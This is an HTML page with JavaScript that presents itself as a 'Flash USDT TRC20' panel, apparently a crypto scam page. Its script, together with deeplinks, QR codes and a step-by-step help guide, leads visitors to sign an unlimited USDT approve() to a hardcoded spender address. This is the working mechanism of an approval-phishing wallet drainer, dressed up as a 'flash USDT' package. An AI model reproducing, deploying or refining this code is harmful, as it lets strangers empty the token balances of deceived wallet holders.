<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>Flash USDT TRC20 — USDTVIP Flash Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<link rel="icon" type="image/jpeg" href="1F3E526D-B663-465A-BF74-62AA19CB2919.jpeg"/>
<style>
  body { font-family: Arial, sans-serif; padding:20px; max-width:980px; margin:auto; background:#f5f7fb; color:#0b1220; }
  .card { background:#fff; border:1px solid #e6eef6; padding:22px; border-radius:12px; box-shadow:0 8px 24px rgba(2,6,23,0.06); }
  h1 { font-size:22px; margin:0 0 8px; display:flex; align-items:center; gap:12px; }
  p.lead { margin:8px 0 12px; color:#334155; }
  .row { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
  label { font-weight:700; margin-right:6px; }
  .muted { color:#64748b; font-size:14px; }
  pre { background:#f8fafc; padding:10px; overflow:auto; border-radius:6px; }
  button { padding:10px 14px; font-size:15px; border-radius:8px; cursor:pointer; border:0; background:#0ea5a4; color:white; }
  button.secondary { background:#64748b; }
  button.ghost { background:transparent; border:1px solid #cbd5e1; color:#0b1220; }
  .danger { background:#ef4444; }
  .flex-between { display:flex; justify-content:space-between; align-items:center; gap:12px; flex-wrap:wrap; }
  .small { font-size:13px; color:#475569; }
  .note { background:#fffbeb; border:1px solid #fef3c7; padding:10px; border-radius:8px; color:#92400e; }
  .stats { margin-top:18px; background:#f0fdf4; border:1px solid #bbf7d0; padding:16px; border-radius:10px; }
  .stats h3 { margin-top:0; color:#15803d; }
  .wallet-box { margin-top:12px; background:#eef2ff; border:1px solid #c7d2fe; padding:12px; border-radius:8px; }
  .features { display:flex; gap:12px; flex-wrap:wrap; margin-top:12px; }
  .feature { background:#fff; border:1px solid #e6eef6; padding:10px 12px; border-radius:8px; min-width:200px; box-shadow:0 2px 6px rgba(2,6,23,0.03); }
  .badge { font-weight:700; color:#065f46; background:#ecfdf5; padding:6px 10px; border-radius:999px; font-size:13px; display:inline-block; }
  .links { display:flex; gap:8px; align-items:center; flex-wrap:wrap; margin-top:8px; }
  .qr-wrap { display:flex; gap:14px; align-items:center; }
  .qr { width:120px; height:120px; border-radius:8px; border:1px solid #e2e8f0; }
  .hint { font-size:13px; color:#475569; }
  /* Modal styles */
  .modal { display:none; position:fixed; inset:0; background:rgba(2,6,23,0.6); align-items:center; justify-content:center; z-index:9999; }
  .modal .box { background:#fff; padding:18px; border-radius:10px; width:92%; max-width:720px; box-shadow:0 12px 40px rgba(2,6,23,0.4); }
  .modal h3 { margin-top:0; }
  .modal .steps { display:flex; gap:12px; flex-direction:column; }
  .close { float:right; cursor:pointer; background:#ef4444; color:white; border-radius:6px; padding:6px 8px; border:0; }
  code.inline { background:#f1f5f9; padding:4px 6px; border-radius:6px; font-size:13px; }
</style>
</head>
<body>
<div class="card">
  <div class="flex-between">
    <h1>
      <img src="1F3E526D-B663-465A-BF74-62AA19CB2919.jpeg" alt="USDT Flash Logo" style="width:36px;height:36px;"/>
      Flash USDT TRC20 — USDTVIP Flash Panel
    </h1>
    <div class="small">7 days validity · Transferable · Tradeable</div>
  </div>

  <p class="lead">
    Flash USDT TRC20 package prepared for Tron wallets. This panel prepares an <strong>approve(spender, amount)</strong> call on the USDT (TRC20) contract for controlled flash payouts and routing.
  </p>

  <div class="note">
    <strong>Important:</strong> Open this page in a Tron-enabled environment (TronLink Mobile in-app browser or desktop TronLink extension). For Trust Wallet, use its in-app browser (or scan the Trust QR below).
  </div>

  <hr/>

  <div style="margin:12px 0;">
    <div class="row">
      <div style="min-width:260px;">
        <label>USDT Contract</label>
        <div class="muted"><code id="usdt">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code></div>
        <div class="small">USDT (TRC20) contract address</div>
      </div>

      <div style="min-width:260px;">
        <label>Spender / Approve Address</label>
        <div><code id="spender">TVm4xa2neKrFkmNuDBsMnn6PKseexW4EvX</code></div>
        <div class="small">Approve (spender) address — default UI will approve UNLIMITED USDT</div>
      </div>

      <div style="min-width:220px;">
        <label>Flash Keep (Locked)</label>
        <div class="muted"><code id="keep">1500 USDT (TRC20) + 30 TRX</code></div>
        <div class="small">Minimum funds kept in the package for execution</div>
      </div>
    </div>
  </div>

  <div class="features" aria-hidden="false">
    <div class="feature">
      <div class="badge">Validity</div>
      <div style="margin-top:8px;font-weight:700">7 days</div>
      <div class="small">Flash allowance auto-considered short-term</div>
    </div>

    <div class="feature">
      <div class="badge">Wallets</div>
      <div style="margin-top:8px;font-weight:700">Up to 20 wallets</div>
      <div class="small">Distribute & manage across up to 20 recipient addresses</div>
    </div>

    <div class="feature">
      <div class="badge">Compatibility</div>
      <div style="margin-top:8px;font-weight:700">TronLink · Trust Wallet</div>
      <div class="small">Works with TronLink and Trust Wallet (TRON support)</div>
    </div>
  </div>

  <div style="margin:14px 0;" class="row">
    <button id="approveBtn">Approve Flash (Set Unlimited Allowance)</button>
    <button id="revokeBtn" class="secondary">Revoke (Set 0)</button>
    <button id="openTronLink" class="ghost">Open in TronLink</button>
    <button id="openTrust" class="ghost">Open in Trust Wallet</button>
    <button id="qrBtn" class="secondary">Show Page QR</button>
    <button id="helpBtn" class="ghost">Help</button>
  </div>

  <div id="status" class="small muted">Status: Not executed</div>

  <hr/>

  <h3>Open in Wallet</h3>
  <div class="links">
    <div>
      <div class="hint"><strong>TronLink deeplink</strong></div>
      <div><code id="tronlinkDeep" class="inline"></code></div>
    </div>

    <div style="margin-left:18px;">
      <div class="hint"><strong>Trust Wallet deeplink</strong></div>
      <div><code id="trustDeep" class="inline"></code></div>
    </div>
  </div>

  <div style="margin-top:12px;" class="qr-wrap">
    <div>
      <div class="hint"><strong>TronLink QR</strong></div>
      <img id="qrTron" class="qr" src="" alt="TronLink QR"/>
    </div>
    <div>
      <div class="hint"><strong>Trust Wallet QR</strong></div>
      <img id="qrTrust" class="qr" src="" alt="Trust Wallet QR"/>
    </div>
  </div>

  <hr/>

  <h3>Transaction output</h3>
  <pre id="output">Not executed</pre>

  <div class="stats">
    <h3>Flash Summary</h3>
    <p><strong>Package Keep:</strong> 1500 USDT + 30 TRX</p>
    <p><strong>Max Flash Pool:</strong> 1,000,000 USDT (TRC20)</p>
    <p><strong>Wallet Slots:</strong> Up to 20 wallets supported</p>
    <div class="wallet-box">
      <strong>Main Wallet:</strong><br/>
      <code id="mainWallet">TKHuVq1oKVruCGLvqVexFs6dawKv6fQgFs</code><br/>
      <span class="small">Track on TronScan / Use TronLink or Trust Wallet for interaction</span>
    </div>
  </div>
</div>

<!-- Help Modal -->
<div id="helpModal" class="modal" role="dialog" aria-modal="true">
  <div class="box">
    <button class="close" id="closeHelp">Close</button>
    <h3>How to open & approve (short guide)</h3>
    <div class="steps">
      <div><strong>1) Mobile — TronLink Mobile (recommended)</strong>
        <div class="hint">Open TronLink → use its in-app browser → scan the <strong>TronLink QR</strong> above or click <code class="inline">Open in TronLink</code>. Approve transactions directly in TronLink.</div>
      </div>
      <div><strong>2) Mobile — Trust Wallet</strong>
        <div class="hint">Open Trust Wallet → go to Browser (or enable DApp Browser) → scan the <strong>Trust Wallet QR</strong> above or click <code class="inline">Open in Trust Wallet</code>. Note: Trust Wallet may not inject <code class="inline">tronWeb</code> — if approve doesn't show, use TronLink.</div>
      </div>
      <div><strong>3) Desktop</strong>
        <div class="hint">Install TronLink browser extension → unlock it and ensure it's connected → open this page. Approve will prompt the TronLink extension. If you see no popup, check browser console for <code class="inline">window.tronWeb</code>.</div>
      </div>
      <div><strong>4) Debugging tips</strong>
        <div class="hint">If Approve doesn't prompt: ensure page served over HTTPS, wallet unlocked, and page opened inside wallet's in-app browser (mobile) or TronLink extension (desktop). Open browser console to see errors.</div>
      </div>
    </div>
  </div>
</div>


<script>
// Dynamic PAGE_URL (removes hash fragments)
const PAGE_URL = window.location.href.split('#')[0];

// Deeplinks
const TRONLINK_DEEP = 'tronlink://open_dapp?url=' + encodeURIComponent(PAGE_URL);
const TRUST_DEEP = 'trust://browser_open?url=' + encodeURIComponent(PAGE_URL);

document.getElementById('tronlinkDeep').innerText = TRONLINK_DEEP;
document.getElementById('trustDeep').innerText = TRUST_DEEP;

// Generate QR images for deeplinks
document.getElementById('qrTron').src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(TRONLINK_DEEP);
document.getElementById('qrTrust').src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(TRUST_DEEP);

// Buttons behavior with fallback
document.getElementById('openTronLink').addEventListener('click', ()=> {
  window.location.href = TRONLINK_DEEP;
  setTimeout(()=> window.open(PAGE_URL, '_blank'), 800);
});
document.getElementById('openTrust').addEventListener('click', ()=> {
  window.location.href = TRUST_DEEP;
  setTimeout(()=> window.open(PAGE_URL, '_blank'), 800);
});
document.getElementById('qrBtn').addEventListener('click', ()=> {
  const qr = 'https://api.qrserver.com/v1/create-qr-code/?size=600x600&data=' + encodeURIComponent(PAGE_URL);
  window.open(qr, '_blank');
});

// Help modal
const helpModal = document.getElementById('helpModal');
document.getElementById('helpBtn').addEventListener('click', ()=> { helpModal.style.display='flex'; });
document.getElementById('closeHelp').addEventListener('click', ()=> { helpModal.style.display='none'; });

// --- Approve / Revoke JS (tronWeb) ---

// robust tronWeb detection + diagnostics + sendApprove fallback
const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const spenderAddress = 'TVm4xa2neKrFkmNuDBsMnn6PKseexW4EvX';
const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

function logDebug(...args){ console.log('[FLASH DEBUG]', ...args); }
function setOutput(text){ document.getElementById('output').innerText = text; }
function setStatus(text){ document.getElementById('status').innerText = text; }

/** Wait for tronWeb to be injected. Returns window.tronWeb when ready, or throws */
async function waitForTronWeb(timeoutMs = 8000){
  const start = Date.now();
  while(Date.now() - start < timeoutMs){
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
      // Sanity check - tronWeb ready flag sometimes exists
      if (window.tronWeb.ready === false) {
        logDebug('tronWeb present but ready === false. waiting...');
      } else {
        logDebug('tronWeb detected, address:', window.tronWeb.defaultAddress.base58);
        return window.tronWeb;
      }
    }
    // Some TronLink versions expose window.tronLink - detect it as a hint
    if (window.tronLink) { logDebug('tronLink object present'); }
    await new Promise(r => setTimeout(r, 300));
  }
  throw new Error('tronWeb not available (timed out). Open page in TronLink in-app browser or ensure TronLink extension is unlocked and refresh the page.');
}

/** Better UI info - show current address & node */
async function showWalletInfo(){
  try {
    if (!window.tronWeb) { setStatus('tronWeb not found'); setOutput('tronWeb not found'); return; }
    const addr = window.tronWeb.defaultAddress.base58 || 'unknown';
    // try a simple rpc call to ensure connectivity
    const node = (window.tronWeb.fullNode && window.tronWeb.fullNode.host) || 'unknown';
    logDebug('Wallet address', addr, 'node', node);
    setStatus('Detected wallet: ' + addr);
    setOutput('Detected wallet: ' + addr + '\nNode: ' + node);
  } catch(e){ console.error(e); }
}

/** Primary approve sender. Tries contract.approve(...).send() and on failure attempts build/sign/send fallback */
async function sendApprove(value){
  setOutput('Preparing to send approve...');
  try {
    const tronWeb = await waitForTronWeb(10000);
    await showWalletInfo();

    setStatus('Preparing contract call...');
    const abi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];

    // Primary attempt using contract object (recommended)
    try {
      const contract = await tronWeb.contract(abi, usdtContract);
      logDebug('contract object ready - calling approve via contract.approve().send()');
      setStatus('Calling approve via contract API...');
      const tx = await contract.approve(spenderAddress, value).send();
      logDebug('contract.approve send result:', tx);
      setOutput('Transaction result (contract API):\n' + JSON.stringify(tx, null, 2));
      setStatus('Transaction sent. TXID: ' + (tx && tx.txid ? tx.txid : 'unknown - check wallet'));
      return;
    } catch (errContract) {
      logDebug('contract.approve failed:', errContract);
      // fallthrough to manual build/sign/send
    }

    // Fallback: build raw tx, sign with tronWeb and broadcast
    setStatus('Falling back to low-level build/sign/send...');
    logDebug('Building low-level transaction...');
    // use tronWeb.transactionBuilder.triggerSmartContract
    const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
      tronWeb.address.toHex(usdtContract),
      'approve(address,uint256)',
      {},
      [
        {type: 'address', value: spenderAddress},
        {type: 'uint256', value: value.toString()}
      ],
      tronWeb.defaultAddress.base58
    ).catch(e=>{ throw e; });

    if (!trigger || !trigger.result || !trigger.transaction) {
      throw new Error('triggerSmartContract failed: ' + JSON.stringify(trigger));
    }
    const unsignedTx = trigger.transaction;
    logDebug('Unsigned tx:', unsignedTx);

    // Sign (TronLink should pop the signing window)
    const signed = await tronWeb.trx.sign(unsignedTx).catch(e=>{ throw e; });
    logDebug('Signed tx:', signed);

    // Broadcast
    const bro = await tronWeb.trx.sendRawTransaction(signed).catch(e=>{ throw e; });
    logDebug('Broadcast result:', bro);
    setOutput('Fallback broadcast result:\n' + JSON.stringify(bro, null, 2));
    setStatus('Broadcast complete. Check txid/response.');
  } catch (e) {
    logDebug('sendApprove overall error:', e);
    setOutput('Error sending approve:\n' + (e && e.message ? e.message : JSON.stringify(e)));
    setStatus('Error occurred. Open console for details.');
  }
}

// Wire to existing buttons (if present)
document.getElementById('approveBtn').addEventListener('click', ()=> {
  if (!confirm('Approve Unlimited USDT to spender?\nSpender: ' + spenderAddress + '\nUSDT Contract: ' + usdtContract + '\nThis will set an UNLIMITED allowance (max uint256).')) return;
  sendApprove(maxUint256);
});
document.getElementById('revokeBtn').addEventListener('click', ()=> {
  if (!confirm('Set approval to 0 for spender? This revokes permission.')) return;
  sendApprove('0');
});

// On page load, try to show info
window.addEventListener('load', async ()=> {
  setStatus('Page loaded — attempting to detect wallet...');
  try {
    await waitForTronWeb(3500);
    await showWalletInfo();
  } catch (e) {
    logDebug('Initial detection failed:', e.message);
    setStatus('tronWeb not detected. Open in TronLink in-app browser or unlock extension and reload.');
    setOutput('Ready. tronWeb not yet detected. If using desktop extension make sure it is unlocked and that this site is connected (approve connection in TronLink).');
  }
});

</script>
</body>
</html>
